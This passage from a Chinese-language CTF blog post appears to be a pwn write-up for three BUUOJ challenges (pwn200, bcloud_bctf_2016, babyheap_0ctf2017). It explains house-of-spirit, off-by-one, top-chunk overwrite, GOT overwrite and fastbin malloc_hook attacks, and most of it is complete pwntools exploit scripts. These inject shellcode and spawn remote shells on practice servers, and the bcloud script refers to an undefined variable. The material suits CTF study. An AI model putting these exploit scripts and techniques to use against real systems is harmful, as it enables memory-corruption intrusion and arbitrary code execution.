class="number">0x31</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp))</span><br><span class="line">shellcode_addr = rbp + offset</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;~~?&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload2 = p64(shellcode_addr) + <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">48</span> + p64(free_got)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;give me money~&#x27;</span>, payload2)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice : &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>house of spirit</p>
<p>因为第一次malloc了0x40字节，单纯栈溢出无法控制next_chunk的size位，需要借助输入的id 用作size。</p>
<p>那么最终构造出的fake chunk对应ptr在0x7ffffffffdf00  &#x3D;&#x3D; leak_rbp - 0x90。</p>
<p>free chunk 构造方式如下</p>
<p><img src="https://i.loli.net/2021/07/08/6i79JoAbPdlWZLn.png" alt="image-20210708220741162"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27340</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&quot;./pwn200&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn200&#x27;)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">payload = shellcode + (<span class="number">48</span>-<span class="built_in">len</span>(shellcode))*<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)[<span class="number">0x31</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp))</span><br><span class="line">input_addr = rbp -<span class="number">0x50</span>  <span class="comment">#shellcode</span></span><br><span class="line"></span><br><span class="line">fake_ptr = rbp - <span class="number">0x90</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;~~?&#x27;</span>,<span class="string">b&#x27;65&#x27;</span>) <span class="comment">#id == next_chunk_size</span></span><br><span class="line">chunk1 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) +p64(<span class="number">0</span>)</span><br><span class="line">chunk1 = chunk1.ljust(<span class="number">56</span>,<span class="string">b&#x27;\x00&#x27;</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;give me money~&#x27;</span>,chunk1 + p64(fake_ptr))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice : &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>) <span class="comment">#free</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice : &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>) <span class="comment">#malloc</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;how long?&#x27;</span>,<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;48&#x27;</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(input_addr)+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bcloud"><a href="#bcloud" class="headerlink" title="bcloud"></a>bcloud</h2><p>off by one 泄露 heap地址，覆盖topchunk_size 实现任意写。最后利用GOT表泄露 libc_base。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./bcloud_bctf_2016&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27722</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bcloud_bctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_note</span>(<span class="params">size, payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;---&gt;&gt;\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;content:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_note</span>(<span class="params"><span class="built_in">id</span>, payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;---&gt;&gt;\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;---&gt;&gt;\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Input your name:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">heap_addr = u32(p.recvuntil(<span class="string">b&#x27;!&#x27;</span>)[<span class="number">4</span>+<span class="number">64</span>+<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">topchunk_addr = heap_addr + <span class="number">0xd0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] Heap addr : &#x27;</span>, <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># change size</span></span><br><span class="line">top_chunk_size = <span class="number">0xffffffff</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Org:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Host:&#x27;</span>)</span><br><span class="line">p.send(p32(top_chunk_size) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc</span></span><br><span class="line">heap_list_head = <span class="number">0x0804B120</span></span><br><span class="line">m_size = heap_list_head - topchunk_addr - <span class="number">2</span>*<span class="number">0x8</span></span><br><span class="line">new_note(m_size, <span class="string">b&#x27;&#x27;</span>)  <span class="comment">#</span></span><br><span class="line">new_note(<span class="number">0x30</span>, flat([<span class="number">0</span>, elf.got[<span class="string">&#x27;free&#x27;</span>], elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">         heap_list_head + <span class="number">0x4</span> * <span class="number">4</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change free to printf</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write puts&quot;</span>)</span><br><span class="line">edit_note(<span class="number">1</span>, p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">puts_real = u32(s[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[=] puts :&quot;</span>, <span class="built_in">hex</span>(puts_real))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc/libc-2.23_32.so&quot;</span>)</span><br><span class="line">libc_base = puts_real - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># change free to system</span></span><br><span class="line">edit_note(<span class="number">1</span>, p32(sys_addr))</span><br><span class="line">delete_note(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="babyheap-0ctf2017"><a href="#babyheap-0ctf2017" class="headerlink" title="babyheap_0ctf2017"></a>babyheap_0ctf2017</h2><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><blockquote>
<p>linux中使用free()进行内存释放时，不大于 max_fast （默认值为 64B）的 chunk 被释放后，首先会被放到 fast bins中，大于max_fast的chunk或者fast bins 中的空闲 chunk 合并后会被放入unsorted bin中（参考glibc内存管理ptmalloc源码分析一文）</p>
</blockquote>
<blockquote>
<p>而在fastbin为空时，unsortbin的fd和bk指向自身main_arena中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出main_arena的实际地址，结合偏移值从而得到libc的加载地址。</p>
</blockquote>
<p>该程序存在堆溢出，可以通过伪造chunk size，free后再malloc实现chunk部分区域的重叠，从而在smart chunk被free后leak 出其fd，得到libc_base。</p>
<h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>Full RELRO 无法修改got表 需要覆盖malloc_hook 地址来getshell,由于有堆溢出，直接free一个fast chunk，然后操作前一个chunk，覆盖已经free的chunk的fd为目的地址即可完成写入。选择malloc_hook-0x23的原因是[malloc_hook-0x23 + 0x8 ] &#x3D;0x000000000000007f，作为chunk size 去满足fastbin的校验。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,payload</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>) </span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.send(payload) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>) </span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28853</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./babyheap_0ctf_2017&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc/libc-2.23_64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===== leak libc =====</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># chunk 0</span></span><br><span class="line">alloc(<span class="number">0x30</span>) <span class="comment"># chunk 1</span></span><br><span class="line">fill(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># modify chunk1 head</span></span><br><span class="line">alloc(<span class="number">0x100</span>) <span class="comment"># chunk 2</span></span><br><span class="line">fill(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) +p64(<span class="number">0x71</span>)) <span class="comment"># construct fake chunk2 head to pass the check</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># chunk 1</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># chunk 1</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>)) <span class="comment"># repair the real chunk2&#x27;s head</span></span><br><span class="line">alloc(<span class="number">0x100</span>)  <span class="comment"># chunk 3</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># free chunk2 to small bin,then chunk&#x27;s fd &amp; bk will be set to main_arena+0x58 </span></span><br><span class="line">        <span class="comment"># (main_arena+0x30 in i386 arch)</span></span><br><span class="line"></span><br><span class="line">dump(<span class="number">1</span>)</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line"><span class="comment">#ma_addr = recv(0x60)[38:]</span></span><br><span class="line">p.recv(<span class="number">0x48</span>)</span><br><span class="line">ma_addr = u64(p.recv(<span class="number">0x8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;main_arena addr:&quot;</span> , <span class="built_in">hex</span>(ma_addr)</span><br><span class="line">libc_base = ma_addr - main_arena_offset - <span class="number">0x58</span></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_hook addr:&quot;</span> , <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;one_gadet addr:&quot;</span>, <span class="built_in">hex</span>(one_gadget)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack </span></span><br><span class="line">alloc(<span class="number">0x100</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">fill(<span class="number">4</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook-<span class="number">0x23</span>)) <span class="comment">#fake fd</span></span><br><span class="line">alloc(<span class="number">0x60</span>)  <span class="comment"># malloc chunk5</span></span><br><span class="line">alloc(<span class="number">0x60</span>)  <span class="comment"># malloc_hook addr </span></span><br><span class="line">fill(<span class="number">6</span>,<span class="string">&#x27;k&#x27;</span>*<span class="number">0x3</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(one_gadget)) <span class="comment"># write one_gadget</span></span><br><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/07/26/Misc/Misc-%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/" title="MISC 杂七杂八"><img class="cover" src="https://s2.loli.net/2024/02/20/9JkbzViQC6hyfW5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">MISC 杂七杂八</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/08/Pwn/Heap-learning-note-devoke/" title="Heap learning note"><img class="cover" src="https://s2.loli.net/2024/02/20/Rz1MuKePOtUjLJ7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Heap learning note</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/05/04/Zav4zFVukLJMBKI.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">devoke</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/03/Reverse/lighthouse%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" title="lighthouse 使用指南">lighthouse 使用指南</a><time datetime="2024-03-03T15:45:14.000Z" title="发表于 2024-03-03 23:45:14">2024-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/19/Life/ES%E5%B0%8F%E4%B8%BB%E6%9C%BA%E6%8A%98%E8%85%BE%E8%AE%B0/" title="ES小主机折腾记">ES小主机折腾记</a><time datetime="2024-02-19T03:05:01.000Z" title="发表于 2024-02-19 11:05:01">2024-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/20/WriteUp/HFCTF2022-RE/" title="HFCTF2022 RE">HFCTF2022 RE</a><time datetime="2022-03-20T12:04:53.000Z" title="发表于 2022-03-20 20:04:53">2022-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/09/WriteUp/%E7%AE%80%E7%AE%80%E5%8D%95%E5%8D%95%E5%AF%86%E7%A0%81%E9%A2%98/" title="简简单单密码题">简简单单密码题</a><time datetime="2022-03-09T12:08:44.000Z" title="发表于 2022-03-09 20:08:44">2022-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/03/Python/Python-multiprocess-learning/" title="Python multiprocess learning">Python multiprocess learning</a><time datetime="2022-02-03T06:25:30.000Z" title="发表于 2022-02-03 14:25:30">2022-02-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2024/02/20/h3iOcSdRqel45vD.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By devoke</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/"></script><script src="/"></script><script src="/"></script><div class="js-pjax"></div></div></body></html>